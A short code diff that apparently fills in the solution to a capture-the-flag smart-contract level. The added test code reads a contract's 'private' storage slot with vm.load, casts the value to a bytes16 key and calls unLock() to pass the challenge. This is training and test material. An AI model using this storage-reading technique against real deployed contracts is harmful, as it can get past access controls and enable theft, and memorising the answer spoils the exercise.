@@ -21,6 +21,11 @@ contract FindMeTest is BaseTest {
 
     function testExploitLevel() public {
         /* YOUR EXPLOIT GOES HERE */
+        uint256 slotnum = 4;
+        bytes32 rawSlot = vm.load(address(instance), bytes32(slotnum));
+        bytes16 key = bytes16(rawSlot);
+
+        instance.unLock(key);
 
         checkSuccess();
     }
